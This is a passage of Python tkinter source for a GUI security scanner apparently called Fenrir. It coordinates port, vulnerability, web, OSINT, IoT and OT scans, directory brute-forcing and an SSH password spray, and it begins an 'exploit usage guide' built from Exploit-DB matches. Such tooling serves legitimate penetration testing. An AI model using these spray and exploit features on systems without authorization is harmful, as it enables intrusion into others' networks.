        tier_row.pack(fill=tk.X, pady=(0, 6))
        ttk.Label(tier_row, text="Build tier:").pack(side=tk.LEFT)
        self._db_tier_var = tk.StringVar(value="core")
        for tier in ["core", "standard", "full"]:
            ttk.Radiobutton(tier_row, text=tier.capitalize(),
                            variable=self._db_tier_var, value=tier).pack(side=tk.LEFT, padx=4)

        self._db_progress_label = ttk.Label(bf, text="")
        self._db_progress_label.pack(fill=tk.X)
        self._db_progress = ttk.Progressbar(bf, mode="indeterminate")
        self._db_progress.pack(fill=tk.X, pady=4)

        btn_row = ttk.Frame(bf)
        btn_row.pack()
        ttk.Button(btn_row, text="Build Database",
                   command=self._db_build).pack(side=tk.LEFT, padx=4)
        ttk.Button(btn_row, text="Update Database",
                   command=self._db_update).pack(side=tk.LEFT, padx=4)
        ttk.Button(btn_row, text="Refresh Status",
                   command=self._refresh_db_status).pack(side=tk.LEFT, padx=4)

    # ─── Status bar ──────────────────────────────────────────────────────────

    def _build_status_bar(self) -> None:
        bar = tk.Frame(self, bg=DARK_BG, height=22)
        bar.pack(side=tk.BOTTOM, fill=tk.X, padx=6, pady=(0, 4))

        self._status_target_label = tk.Label(
            bar, text="Ready", bg=DARK_BG, fg=ACCENT,
            font=("Helvetica", 9), anchor="w")
        self._status_target_label.pack(side=tk.LEFT, padx=4)

        self._status_time_label = tk.Label(
            bar, text="", bg=DARK_BG, fg=TEXT_FG,
            font=("Helvetica", 9), anchor="e")
        self._status_time_label.pack(side=tk.RIGHT, padx=4)

        self._status_mem_label = tk.Label(
            bar, text="", bg=DARK_BG, fg=DEBUG_FG,
            font=("Helvetica", 9), anchor="e")
        self._status_mem_label.pack(side=tk.RIGHT, padx=4)

    def _update_background(self) -> None:
        """Redraw the background image on the root canvas."""
        if not hasattr(self, "_bg_canvas"):
            return
        c = self._bg_canvas
        w, h = self.winfo_width(), self.winfo_height()
        if w < 10 or h < 10:
            return
        c.configure(width=w, height=h, bg=DARK_BG)
        c.delete("bg")

        bg_path = branding.background_path
        opacity = float(self._bg_opacity_var.get())

        if not bg_path or not bg_path.exists() or opacity < 0.01:
            return

        if not PIL_OK:
            return

        try:
            img = Image.open(bg_path).resize((w, h), Image.Resampling.LANCZOS).convert("RGBA")
            # opacity=1.0 → full image visible (overlay_alpha=0)
            # opacity=0.0 → image invisible (overlay_alpha=255)
            overlay_alpha = int((1.0 - opacity) * 255)
            r, g, b = _hex_to_rgb(DARK_BG)
            overlay = Image.new("RGBA", img.size, (r, g, b, overlay_alpha))
            merged  = Image.alpha_composite(img, overlay).convert("RGB")
            self._bg_photo = ImageTk.PhotoImage(merged)
            c.create_image(0, 0, anchor="nw", image=self._bg_photo, tags="bg")
            # Keep canvas behind everything
            c.lower("bg")
        except Exception as exc:
            log.debug(f"[bg] Background render failed: {exc}")

    def _build_header_strip(self) -> None:
        """Thin branded header bar: logo + title. Sits above the notebook."""
        hdr = tk.Frame(self, bg=DARK_BG, height=42)
        hdr.pack(fill=tk.X, side=tk.TOP)
        hdr.pack_propagate(False)

        # Logo
        logo_path = branding.logo_path
        if logo_path and logo_path.exists() and PIL_OK:
            try:
                img = Image.open(logo_path).resize((30, 30), Image.Resampling.LANCZOS)
                self._header_logo = ImageTk.PhotoImage(img)
                tk.Label(hdr, image=self._header_logo, bg=DARK_BG).pack(
                    side=tk.LEFT, padx=(10, 6), pady=6)
            except Exception:
                pass
        else:
            # Procedural wolf icon
            if PIL_OK:
                try:
                    img = _make_wolf_icon(30)
                    self._header_logo = ImageTk.PhotoImage(img)
                    tk.Label(hdr, image=self._header_logo, bg=DARK_BG).pack(
                        side=tk.LEFT, padx=(10, 6), pady=6)
                except Exception:
                    pass

        # Title
        tk.Label(hdr, text=branding.window_title, bg=DARK_BG, fg=ACCENT,
                 font=("Helvetica", 13, "bold")).pack(side=tk.LEFT, pady=6)

        # Version / tagline right-aligned
        tk.Label(hdr, text="Security Scanner  v2.0", bg=DARK_BG, fg=DEBUG_FG,
                 font=("Helvetica", 8)).pack(side=tk.RIGHT, padx=12)

    def _update_header(self) -> None:
        """Refresh header after branding change (called by fenrir_brand.py indirectly)."""
        self.title(branding.window_title)
        self._set_icon()

    # =========================================================================
    # Scan control
    # =========================================================================

    def _start_scan(self) -> None:
        target = self._target_var.get().strip()
        if not target:
            messagebox.showerror("Validation", "Target cannot be empty.")
            return
        if self._scan_thread and self._scan_thread.is_alive():
            messagebox.showwarning("Busy", "A scan is already running.")
            return

        warnings = []
        if self._module_vars["threat_intel"].get():
            for key in ("virustotal", "alienvault"):
                ok, msg = config.validate_key(key)
                if not ok:
                    warnings.append(msg)
        if self._module_vars["vuln_scan"].get():
            ok, msg = config.validate_key("nvd")
            if not ok:
                warnings.append(f"NVD: {msg} — offline DB will be used if available")

        if warnings:
            msg = ("Some API keys not configured:\n\n"
                   + "\n".join(f"  • {w}" for w in warnings)
                   + "\n\nOffline data will be used where available. Continue?")
            if not messagebox.askyesno("API Keys", msg):
                return

        # Resolve output directory:
        # - If user typed a custom path, use it as-is (create a timestamped
        #   sub-folder inside it so each scan stays separate).
        # - If the field is empty or still at the default RESULTS_DIR,
        #   auto-name: Results/YYYY-MM-DD_HH-MM_target/
        user_dir = self._output_dir_var.get().strip()
        default  = str(RESULTS_DIR)
        if user_dir and user_dir != default and user_dir != str(RESULTS_DIR) + "/":
            # User specified a custom location — create a timestamped sub-folder there
            try:
                from datetime import datetime
                ts       = datetime.now().strftime("%Y-%m-%d_%H-%M")
                output_dir = str(Path(user_dir) / f"{ts}_{target.replace('/', '_')[:40]}")
                Path(output_dir).mkdir(parents=True, exist_ok=True)
            except Exception:
                output_dir = user_dir
        else:
            # Auto-name inside the default Results/ directory
            try:
                output_dir = str(make_result_dir(target, "scan"))
            except Exception:
                output_dir = default

        log.info(f"Output directory: {output_dir}")
        self._output_dir_var.set(output_dir)

        # Record scan start in history
        modules_on = [k for k, v in self._module_vars.items() if v.get()]
        self._current_scan_id = self._history.begin_scan(target, "single", modules_on)

        # Reset UI
        self._module_timings.clear()
        self._clear_timing_tree()
        self._clear_debug_log()
        for tree in [self._ports_tree, self._vulns_tree, self._exploits_tree,
                     self._recon_tree, self._threats_tree]:
            tree.delete(*tree.get_children())
        self._exploit_findings.clear()
        self._clear_output()
        self._cancel_event.clear()
        self._scan_start = time.monotonic()
        self._start_btn.configure(state="disabled")
        self._stop_btn.configure(state="normal")
        self._status_target_label.configure(text=f"Scanning: {target}")
        self._results_status.configure(text="Scan in progress…")

        self._scan_thread = threading.Thread(
            target=self._run_in_thread,
            args=(target, output_dir),
            daemon=True,
        )
        self._scan_thread.start()

    def _stop_scan(self) -> None:
        if self._scan_thread and self._scan_thread.is_alive():
            log.warning("Stop requested — cancelling scan...")
            self._cancel_event.set()
            self._debug_log("Scan cancelled by user.", "WARNING")
        self._stop_btn.configure(state="disabled")

    def _run_in_thread(self, target: str, output_dir: str) -> None:
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(self._run_scan_async(target, output_dir))
        except Exception as exc:
            log.error(f"Scan thread error: {exc}")
            self._debug_log(f"Scan thread error: {exc}", "ERROR")
        finally:
            self.after(0, self._on_scan_done)

    def _on_scan_done(self) -> None:
        self._start_btn.configure(state="normal")
        self._stop_btn.configure(state="disabled")
        elapsed = time.monotonic() - (self._scan_start or time.monotonic())
        self._status_target_label.configure(
            text=f"Scan complete — {_fmt_elapsed(elapsed)}"
        )
        # Save to history
        if self._last_report and self._current_scan_id >= 0:
            try:
                output_dir = self._output_dir_var.get()
                summary    = {"duration_s": round(elapsed, 1)}
                report_json = {}
                if hasattr(self._last_report, "get_sections"):
                    report_json = {"sections": self._last_report.get_sections()}
                self._history.finish_scan(
                    self._current_scan_id, output_dir, summary, report_json
                )
                self.after(500, self._refresh_history_tab)
            except Exception as exc:
                log.debug(f"[history] finish error: {exc}")
        # Populate results
        if self._last_report:
            self.after(0, self._populate_results)
        # Enrich CVEs with EPSS scores in background
        self.after(200, self._enrich_epss_async)

    # =========================================================================
    # Scan orchestrator
    # =========================================================================

    async def _run_scan_async(self, target: str, output_dir: str) -> None:
        log.info(f"{'─' * 56}")
        log.info(f"  Fenrir scan started — target: {target}")
        log.info(f"{'─' * 56}")

        report = ReportManager(output_dir, target)
        self._last_report = report
        mv     = self._module_vars
        cancel = self._cancel_event
        global_timeout = self._module_timeout_var.get()

        # Semaphore for heavy modules — prevents OOM when all ticked
        heavy_sem = asyncio.Semaphore(MAX_CONCURRENT_HEAVY)

        def cancelled() -> bool:
            if cancel.is_set():
                log.warning("Scan cancelled by user.")
                return True
            return False

        async def _run_module(key: str, coro) -> None:
            """Wrap a module coroutine with timing, timeout, and heavy-module gating."""
            # Guard: if module failed to import, coro may be None or not a coroutine
            if coro is None:
                log.warning(f"Module '{key}' unavailable (import failed) — skipping.")
                self._timing_queue.put(("skip", key, time.monotonic(), "skipped",
                                        "Module not available"))
                return
            import inspect
            if not inspect.isawaitable(coro):
                log.error(f"Module '{key}' did not return an awaitable — skipping.")
                return

            module_timeout = min(global_timeout, MODULE_TIMEOUTS.get(key, 300))
            is_heavy = key in HEAVY_MODULES

            self._timing_queue.put(("start", key, time.monotonic()))
            try:
                if is_heavy:
                    async with heavy_sem:
                        await asyncio.wait_for(coro, timeout=module_timeout)
                else:
                    await asyncio.wait_for(coro, timeout=module_timeout)
                self._timing_queue.put(("done", key, time.monotonic(), "ok", ""))
            except asyncio.TimeoutError:
                msg = f"Module '{key}' timed out after {module_timeout}s"
                log.error(msg)
                self._debug_log(msg, "TIMEOUT")
                self._timing_queue.put(("done", key, time.monotonic(), "timeout",
                                        f"Timed out after {module_timeout}s"))
            except asyncio.CancelledError:
                self._timing_queue.put(("done", key, time.monotonic(), "cancelled", ""))
                raise
            except Exception as exc:
                msg = f"Module '{key}' raised: {exc}"
                log.error(msg)
                self._debug_log(msg, "ERROR")
                self._timing_queue.put(("done", key, time.monotonic(), "error", str(exc)))

        # Parse options
        ports_str = self._ports_var.get().strip()
        try:
            requested_ports = parse_ports(ports_str) if ports_str else None
        except ValueError as exc:
            log.error(f"Invalid port specification: {exc}")
            return

        wordlist_path  = self._wordlist_var.get().strip() or None
        cve_limit      = self._cve_limit_var.get()
        port_timeout   = self._port_timeout_var.get()
        skip_hostup    = self._skip_hostup_var.get()
        is_private     = _is_private_ip(target)

        if is_private:
            log.info(
                f"Target {target} is a private/RFC1918 address — "
                f"WHOIS raw, VirusTotal, OSINT, and Subdomain modules "
                f"will be skipped (no useful results for private IPs)."
            )

        try:
            # ── Host-up pre-check ─────────────────────────────────────────────────
            if not skip_hostup:
                log.info(f"Pre-check: testing reachability of {target}...")
                host_up = await _host_is_up(target, timeout=2.0)
                if not host_up:
                    log.warning(
                        f"  {target} did not respond to any probe port. "
                        f"Host may be offline, heavily firewalled, or sleeping. "
                        f"Continuing with port scan anyway (tick 'Skip host-up check' "
                        f"to suppress this warning)."
                    )
                else:
                    log.info(f"  {target} is reachable.")

            # ── Phase 1: Port scan ────────────────────────────────────────────────
            open_ports: list[int] = []
            if mv["port_scan"].get() or mv["vuln_scan"].get():
                if not cancelled():
                    log.info("Phase 1: Port scan")
                    self._timing_queue.put(("start", "port_scan", time.monotonic()))
                    try:
                        open_ports = await asyncio.wait_for(
                            PortScanner(timeout=port_timeout).run(
                                target, ports=requested_ports, report=report),
                            timeout=MODULE_TIMEOUTS["port_scan"],
                        )
                        self._timing_queue.put(("done", "port_scan", time.monotonic(), "ok",
                                                f"{len(open_ports)} open ports"))
                    except asyncio.TimeoutError:
                        self._timing_queue.put(("done", "port_scan", time.monotonic(), "timeout",
                                                "Timed out"))
                        log.error("Port scan timed out.")
                    except Exception as exc:
                        self._timing_queue.put(("done", "port_scan", time.monotonic(), "error",
                                                str(exc)))
                        log.error(f"Port scan error: {exc}")
                    log.info(f"  Open ports: {open_ports or 'none found'}")

            if cancelled():
                report.finalize(); return

            found_web_ports = [p for p in open_ports if p in WEB_PORTS]
            found_ssh_ports = [p for p in open_ports if p == SSH_PORT]

            # ── Auto: Android device detection ────────────────────────────────────
            # Port 5555 = ADB-over-TCP.  Trigger automatically without a checkbox.
            ADB_PORTS = [p for p in open_ports if p in (5555, 5554, 5556, 5558)]
            if ADB_PORTS and AndroidScanner is not None:
                log.info(
                    f"ADB port(s) detected: {ADB_PORTS} — "
                    f"triggering Android Device Scanner automatically."
                )
                for adb_port in ADB_PORTS:
                    await _run_module(
                        "android_scan",
                        AndroidScanner().run(target, port=adb_port, report=report),
                    )
            elif not ADB_PORTS and self._profile_var.get() == "Android Device":
                log.warning(
                    "Android Device profile selected but port 5555 (ADB) was not found open. "
                    "To enable ADB over network on the device:\n"
                    "  1. Connect via USB and run: adb tcpip 5555\n"
                    "  2. Or: Settings → Developer Options → Wireless debugging\n"
                    "  3. Check the device is not sleeping (screen lock disables ADB TCP on some ROMs)\n"
                    "  Try increasing Port timeout in Advanced Options if the device is slow to respond."
                )

            # ── Phase 2: Parallel recon/analysis ──────────────────────────────────
            log.info("Phase 2: Analysis & recon")
            phase2 = []

            if mv["vuln_scan"].get() and open_ports:
                phase2.append(_run_module("vuln_scan",
                    VulnerabilityScanner(cve_limit=cve_limit).run(target, open_ports, report=report)))
            elif mv["vuln_scan"].get() and not open_ports:
                self._timing_queue.put(("skip", "vuln_scan", time.monotonic(), "skipped",
                                        "No open ports"))
                log.info("Vulnerability scan skipped — no open ports found.")

            if mv["web_scan"].get() and found_web_ports:
                phase2.append(_run_module("web_scan",
                    WebScanner().run(target, found_web_ports, report=report)))
            elif mv["web_scan"].get() and not found_web_ports:
                self._timing_queue.put(("skip", "web_scan", time.monotonic(), "skipped",
                                        "No web ports open"))

            if mv["tech_detect"].get() and found_web_ports:
                phase2.append(_run_module("tech_detect",
                    TechDetector().run(target, found_web_ports, report=report)))

            if mv["dns_scan"].get():
                phase2.append(_run_module("dns_scan",
                    DnsScanner().run(target, report=report)))

            # WHOIS: skip raw text for private IPs — it's just RFC1918 boilerplate
            if mv["whois_scan"].get() and not is_private:
                phase2.append(_run_module("whois_scan",
                    WhoisScanner().run(target, report=report)))
            elif mv["whois_scan"].get() and is_private:
                self._timing_queue.put(("skip", "whois_scan", time.monotonic(), "skipped",
                                        "Private IP — no useful WHOIS data"))
                log.info("WHOIS skipped — private/RFC1918 address.")

            # Subdomain: pointless on raw IPs
            if mv["subdomain_scan"].get() and not is_private and not _looks_like_ip(target):
                phase2.append(_run_module("subdomain_scan",
                    SubdomainScanner(wordlist_path=wordlist_path).run(target, report=report)))
            elif mv["subdomain_scan"].get():
                self._timing_queue.put(("skip", "subdomain_scan", time.monotonic(), "skipped",
                                        "IP address target — subdomain scan N/A"))

            # Threat intel: skip for private IPs (VirusTotal returns 0 detections always)
            if mv["threat_intel"].get() and not is_private:
                phase2.append(_run_module("threat_intel",
                    ThreatIntelScanner().run(target, report=report)))
            elif mv["threat_intel"].get() and is_private:
                self._timing_queue.put(("skip", "threat_intel", time.monotonic(), "skipped",
                                        "Private IP — VirusTotal/OTX not useful"))
                log.info("Threat intelligence skipped — private/RFC1918 address.")

            # OSINT: skip for private IPs (no public records)
            if mv["osint_scan"].get() and not is_private:
                phase2.append(_run_module("osint_scan",
                    OsintScanner().run(target, report=report)))
            elif mv["osint_scan"].get() and is_private:
                self._timing_queue.put(("skip", "osint_scan", time.monotonic(), "skipped",
                                        "Private IP — no public OSINT data"))
                log.info("OSINT scan skipped — private/RFC1918 address.")

            if phase2 and not cancelled():
                await asyncio.gather(*phase2, return_exceptions=True)

            if cancelled():
                report.finalize(); return

            # ── Phase 3: Dir brute-force ───────────────────────────────────────────
            if mv["dir_brute"].get() and found_web_ports and not cancelled():
                log.info("Phase 3: Directory brute-force")
                await _run_module("dir_brute",
                    DirBruteForcer(wordlist_path=wordlist_path).run(
                        target, found_web_ports, report=report))

            # ── Phase 4: Specialised (parallel) ────────────────────────────────────
            log.info("Phase 4: Specialised modules")
            phase4 = []

            if mv["exploit_search"].get():
                query = self._exploit_query_var.get().strip() or target
                phase4.append(_run_module("exploit_search",
                    ExploitScanner().run(query, report=report)))

            if mv["iot_scan"].get():
                if open_ports:
                    phase4.append(_run_module("iot_scan",
                        IotScanner().run(target, open_ports, report=report)))
                else:
                    self._timing_queue.put(("skip", "iot_scan", time.monotonic(), "skipped",
                                            "No open ports — IoT scan skipped"))
                    log.info("IoT scan skipped — no open ports found.")

            if mv["rf_scan"].get():
                phase4.append(_run_module("rf_scan",
                    RfScanner().run(
                        freq_range=self._rf_range_var.get().strip(),
                        threshold=self._rf_threshold_var.get(),
                        report=report)))

            if phase4 and not cancelled():
                await asyncio.gather(*phase4, return_exceptions=True)

            # ── Phase 5: Sequential blocking modules ───────────────────────────────
            if mv["pass_spray"].get() and not cancelled():
                password  = self._spray_pass_var.get().strip()
                usernames = [u.strip() for u in self._spray_users_var.get().split(",") if u.strip()]
                spray_port = found_ssh_ports[0] if found_ssh_ports else 22
                if password and usernames:
                    log.info(f"Phase 5: Password spray ({self._spray_service_var.get()})")
                    await _run_module("pass_spray",
                        PasswordSprayer().run(
                            target, spray_port, usernames, password,
                            service=self._spray_service_var.get(), report=report))
                else:
                    log.warning("Password spray: no password or usernames configured — skipping.")
                    self._timing_queue.put(("skip", "pass_spray", time.monotonic(), "skipped",
                                            "No credentials provided"))

            if mv["ot_scan"].get() and not cancelled():
                # OT scan is meaningful even without open ports (passive sniffing)
                # but log clearly if no OT-relevant ports were found
                ot_ports = {p for p in open_ports if p in (
                    502, 102, 44818, 20000, 47808, 4840, 1089, 1090, 1091,
                    2222, 4000, 9600, 19999, 20547, 34962, 34963, 34964,
                )}
                if ot_ports:
                    log.info(
                        f"Phase 5: OT/ICS scan — OT-relevant port(s) found: {ot_ports}"
                    )
                else:
                    log.info(
                        "Phase 5: OT/ICS scan — no OT-specific ports found in port scan. "
                        "Running passive detection anyway."
                    )
                await _run_module("ot_scan",
                    OtScanner().run(target_ip=target, duration=self._ot_duration_var.get(),
                                    report=report))

            if mv["mobile_scan"].get() and not cancelled():
                apk_path = self._apk_var.get().strip()
                if apk_path:
                    log.info(f"Phase 5: Mobile APK analysis — {apk_path}")
                    await _run_module("mobile_scan",
                        MobileScanner().run(apk_path, report=report))
                else:
                    log.warning("Mobile scan: no APK path specified — skipping.")
                    self._timing_queue.put(("skip", "mobile_scan", time.monotonic(), "skipped",
                                            "No APK path"))

            # ── Finalize — always runs even if a phase raised an exception ─────────
        except Exception as exc:
            log.error(f"Scan encountered an error: {exc}")
        finally:
            report.finalize()
            log.info(f"{'─' * 56}")
            log.info(f"  Scan complete.")
            for p in (report.txt_path, report.json_path):
                log.info(f"  Report: {p}")
            log.info(f"{'─' * 56}")

    def _populate_results(self) -> None:
        """Parse report sections and populate all results trees after scan."""
        if not self._last_report:
            return

        sections = self._last_report.get_sections()

        # Clear trees
        for tree in [self._ports_tree, self._vulns_tree, self._exploits_tree,
                     self._recon_tree, self._threats_tree]:
            tree.delete(*tree.get_children())
        self._exploit_findings.clear()

        total_items = 0

        for section in sections:
            title    = section.get("title", "").lower()
            findings = section.get("findings", [])

            for finding in findings:
                total_items += 1

                # ── Ports ──────────────────────────────────────────────
                if "port" in title and ("open" in title or "scan" in title):
                    self._insert_port_finding(finding)

                # ── Vulnerabilities / CVEs ─────────────────────────────
                elif any(k in title for k in ("cve", "vulnerabilit", "vuln")):
                    self._insert_vuln_finding(finding)

                # ── Exploits ───────────────────────────────────────────
                elif any(k in title for k in ("exploit", "shellcode", "ghdb")):
                    self._insert_exploit_finding(finding)
                # ── Threats / IOC ──────────────────────────────────────
                elif any(k in title for k in ("threat", "ioc", "malware", "reputation",
                                               "virustotal", "otx", "intel")):
                    self._insert_threat_finding(finding)

                # ── Android security findings → Vulnerabilities tab ────
                elif any(k in title for k in ("android security", "android root",
                                               "android attack", "android suspicious")):
                    self._insert_vuln_finding(finding)

                # ── Recon (everything else, incl. Android identity/policy)
                else:
                    self._insert_recon_finding(section["title"], finding)

        # Re-number rows with alternating colours
        for tree in [self._ports_tree, self._vulns_tree, self._exploits_tree,
                     self._recon_tree, self._threats_tree]:
            self._restripe_tree(tree)

        # Cross-link: for each CVE in vulns, find matching exploits
        self._crosslink_cve_exploits()

        # Update status
        vuln_count    = len(self._vulns_tree.get_children())
        exploit_count = len(self._exploits_tree.get_children())
        port_count    = len(self._ports_tree.get_children())
        self._results_status.configure(
            text=f"Results: {port_count} ports · {vuln_count} vulnerabilities · "
                 f"{exploit_count} exploits · {total_items} total findings"
        )
        self._results_count_label.configure(
            text=f"{total_items} findings"
        )

        # Switch to Results tab automatically (Tab index 2: Scan=0, Network=1, Results=2)
        self._root_notebook.select(2)

    def _insert_port_finding(self, finding) -> None:
        if isinstance(finding, dict):
            port     = str(finding.get("port", finding.get("Port", "")))
            proto    = str(finding.get("protocol", finding.get("Protocol", "tcp")))
            service  = str(finding.get("service", finding.get("Service", "")))
            version  = str(finding.get("version", finding.get("Version", "")))
            state    = str(finding.get("state", finding.get("State", "open")))
        else:
            # Plain string like "80/tcp - http"
            parts = str(finding).split()
            port    = parts[0] if parts else str(finding)
            proto   = "tcp"
            service = parts[-1] if len(parts) > 1 else ""
            version = ""
            state   = "open"
        self._ports_tree.insert("", tk.END, values=(port, proto, service, version, state))

    def _insert_vuln_finding(self, finding) -> None:
        if not isinstance(finding, dict):
            self._vulns_tree.insert("", tk.END,
                values=(str(finding), "", "", "", "", ""))
            return

        # Android security finding format: {severity, check, detail}
        if "check" in finding and "detail" in finding and "id" not in finding:
            severity = str(finding.get("severity", "")).upper()
            check    = str(finding.get("check", ""))
            detail   = str(finding.get("detail", ""))[:250]
            sev_lower = severity.lower()
            tag = ("critical" if "critical" in sev_lower else
                   "high"     if "high"     in sev_lower else
                   "medium"   if "medium"   in sev_lower else "low")
            self._vulns_tree.insert("", tk.END,
                values=(check, "—", severity, "—", "Android", detail),
                tags=(tag,))
            return

        # Standard CVE format
        cve_id   = str(finding.get("id", finding.get("cve_id", "")))
        score    = finding.get("score", finding.get("cvss_v3_score", ""))
        severity = str(finding.get("severity", finding.get("cvss_v3_severity", ""))).upper()
        port     = str(finding.get("port", ""))
        service  = str(finding.get("service", ""))
        desc     = str(finding.get("description", ""))[:200]

        sev_lower = severity.lower()
        tag = ("critical" if "critical" in sev_lower else
               "high"     if "high"     in sev_lower else
               "medium"   if "medium"   in sev_lower else
               "low"      if "low"      in sev_lower else "")

        self._vulns_tree.insert("", tk.END,
            values=(cve_id, score, severity, port, service, desc),
            tags=(tag,))

    def _insert_exploit_finding(self, finding) -> None:
        if not isinstance(finding, dict):
            self._exploits_tree.insert("", tk.END,
                values=(str(finding), "", "", "", "", "", ""))
            return
        eid      = str(finding.get("id", finding.get("edb_id", "")))
        title    = str(finding.get("title", ""))[:120]
        etype    = str(finding.get("type", ""))
        platform = str(finding.get("platform", ""))
        cves     = ", ".join(finding.get("cve_ids", []) or [])
        verified = "✓" if finding.get("verified") else ""
        path     = str(finding.get("local_file_path", "") or "")
        iid = self._exploits_tree.insert("", tk.END,
            values=(eid, title, etype, platform, cves, verified, path))
        # Store full finding dict on the item for guide window retrieval
        self._exploit_findings[iid] = finding

    def _insert_threat_finding(self, finding) -> None:
        if not isinstance(finding, dict):
            self._threats_tree.insert("", tk.END,
                values=(str(finding), "", "", "", ""))
            return
        indicator = str(finding.get("indicator", finding.get("ip", finding.get("ioc", ""))))
        ioc_type  = str(finding.get("ioc_type", finding.get("type", "")))
        source    = str(finding.get("source", finding.get("feed", "")))
        severity  = str(finding.get("severity", "")).upper()
        details   = str(finding.get("details", finding.get("malware_family",
                        finding.get("tags", ""))))[:200]

        sev_lower = severity.lower()
        tag = ("critical" if "critical" in sev_lower else
               "high"     if "high"     in sev_lower else
               "medium"   if "medium"   in sev_lower else "")

        self._threats_tree.insert("", tk.END,
            values=(indicator, ioc_type, source, severity, details),
            tags=(tag,))

    def _insert_recon_finding(self, category: str, finding) -> None:
        if isinstance(finding, dict):
            for key, value in finding.items():
                self._recon_tree.insert("", tk.END,
                    values=(category, str(key), str(value)[:300]))
        else:
            self._recon_tree.insert("", tk.END,
                values=(category, "", str(finding)[:300]))

    def _crosslink_cve_exploits(self) -> None:
        """
        For each CVE in the Vulnerabilities tree, check if any exploits in the
        Exploits tree list that CVE.  If so, add the CVE as a tag/highlight on
        the exploit row and add a note to the CVE row.
        """
        # Build CVE → exploit_iid mapping
        cve_to_exploits: dict[str, list[str]] = {}
        for iid in self._exploits_tree.get_children():
            vals = self._exploits_tree.item(iid, "values")
            cves_str = vals[4] if len(vals) > 4 else ""
            for cve_id in cves_str.split(","):
                cve_id = cve_id.strip()
                if cve_id:
                    cve_to_exploits.setdefault(cve_id, []).append(iid)

        # Annotate vuln rows that have matching exploits
        for iid in self._vulns_tree.get_children():
            vals   = self._vulns_tree.item(iid, "values")
            cve_id = vals[0] if vals else ""
            if cve_id in cve_to_exploits:
                n = len(cve_to_exploits[cve_id])
                # Append exploit count to description
                existing = list(vals)
                existing[5] = f"[{n} exploit(s) available] " + existing[5]
                self._vulns_tree.item(iid, values=existing,
                                       tags=(self._vulns_tree.item(iid, "tags") + ("match",)))

        self._restripe_tree(self._exploits_tree)

    def _restripe_tree(self, tree: ttk.Treeview) -> None:
        for i, iid in enumerate(tree.get_children()):
            existing_tags = list(tree.item(iid, "tags"))
            # Remove old stripe tags
            existing_tags = [t for t in existing_tags if t not in ("odd", "even")]
            existing_tags.append("odd" if i % 2 == 0 else "even")
            tree.item(iid, tags=existing_tags)

    # ─── Search / filter ─────────────────────────────────────────────────────

    def _filter_results(self) -> None:
        """Filter all results trees to show only rows matching the search query."""
        query = self._results_search_var.get().strip().lower()

        # We re-populate from the report — hide non-matching rows by storing full data
        # in tags and re-populating filtered.  Since tkinter Treeview can't hide rows,
        # we rebuild with a subset.
        if not self._last_report:
            return

        # Re-populate everything, then filter
        self._populate_results()  # rebuilds from report

        if not query:
            return

        match_count = 0
        for tree in [self._ports_tree, self._vulns_tree, self._exploits_tree,
                     self._recon_tree, self._threats_tree]:
            to_delete = []
            for iid in tree.get_children():
                vals = tree.item(iid, "values")
                row_text = " ".join(str(v) for v in vals).lower()
                if query in row_text:
                    match_count += 1
                else:
                    to_delete.append(iid)
            for iid in to_delete:
                tree.delete(iid)

        self._results_count_label.configure(text=f"{match_count} matching")

    def _sort_tree_by_score(self, tree: ttk.Treeview, col: str) -> None:
        """Sort vulnerabilities by CVSS score descending."""
        data = [(tree.item(iid, "values"), iid) for iid in tree.get_children()]
        col_idx = tree["columns"].index(col)
        data.sort(key=lambda x: float(x[0][col_idx]) if x[0][col_idx] else 0,
                  reverse=True)
        for vals, iid in data:
            tree.move(iid, "", tk.END)
        self._restripe_tree(tree)

    # ─── Context menu ────────────────────────────────────────────────────────

    def _show_tree_context_menu(self, event: tk.Event) -> None:
        self._tree_event_widget = event.widget
        self._tree_menu.tk_popup(event.x_root, event.y_root)

    def _copy_tree_selection(self) -> None:
        tree = getattr(self, "_tree_event_widget", None)
        if not tree:
            return
        selected = tree.selection()
        lines = []
        for iid in selected:
            vals = tree.item(iid, "values")
            lines.append("\t".join(str(v) for v in vals))
        self.clipboard_clear()
        self.clipboard_append("\n".join(lines))

    def _show_exploit_guide(self, tree: ttk.Treeview) -> None:
        """
        Show a detailed 'How to Use' guide for the selected exploit row.
        Covers: file path, EDB link, exploit type usage, Metasploit search,
        manual verification steps, CVE context, and local file content preview.
        """
        sel = tree.selection()
        if not sel:
            return
        iid     = sel[0]
        finding = self._exploit_findings.get(iid)
        if not finding:
            # Fallback: build a basic guide from column values
            vals = tree.item(iid, "values")
            finding = {
                "id": vals[0] if vals else "",
                "title": vals[1] if len(vals) > 1 else "",
                "type": vals[2] if len(vals) > 2 else "",
                "platform": vals[3] if len(vals) > 3 else "",
            }

        eid       = str(finding.get("id") or finding.get("edb_id") or "")
        title     = finding.get("title", "Unknown exploit")
        etype     = (finding.get("type", "") or "").lower()
        platform  = finding.get("platform", "")
        cve_ids   = finding.get("cve_ids", []) or []
        if isinstance(cve_ids, str):
            cve_ids = [c.strip() for c in cve_ids.split(",") if c.strip()]
        edb_url        = finding.get("edb_url", "") or \
                         (f"https://www.exploit-db.com/exploits/{eid}" if eid else "")
        local_path     = finding.get("local_file_path", "")
        matched_cve    = finding.get("matched_cve", "")
        matched_svc    = finding.get("matched_service", "")
        matched_port   = finding.get("matched_port", "")
        author         = finding.get("author", "")
        date_published = finding.get("date_published", "")
        verified       = finding.get("verified", False)

        # ── Build guide text ─────────────────────────────────────────────────
        lines = []
        def h(text): lines.append(f"\n{'━' * 70}\n  {text}\n{'━' * 70}")
        def s(text): lines.append(f"\n{text}")
        def b(text): lines.append(text)

        h(f"EXPLOIT USAGE GUIDE")
        b(f"  Title    : {title}")
        b(f"  EDB-ID   : {eid}")
        b(f"  Type     : {etype or '—'}")
        b(f"  Platform : {platform or '—'}")
        b(f"  Author   : {author or '—'}")
        b(f"  Published: {date_published or '—'}")
        b(f"  Verified : {'Yes ✓' if verified else 'No'}")
        if cve_ids:
            b(f"  CVEs     : {', '.join(cve_ids)}")
        if matched_svc:
            b(f"  Matched  : {matched_svc} (port {matched_port})")

        # ── References ───────────────────────────────────────────────────────
        h("REFERENCES")
        if edb_url:
            b(f"  Exploit-DB  : {edb_url}")
        for cve in cve_ids:
            b(f"  NVD         : https://nvd.nist.gov/vuln/detail/{cve}")
            b(f"  MITRE       : https://cve.mitre.org/cgi-bin/cvename.cgi?name={cve}")
        if local_path:
            b(f"  Local file  : {local_path}")

        # ── Local file path ───────────────────────────────────────────────────
        h("LOCAL EXPLOIT FILE")
        if local_path:
            b(f"  Path : {local_path}")
            b(f"")
            b(f"  Copy to working directory:")
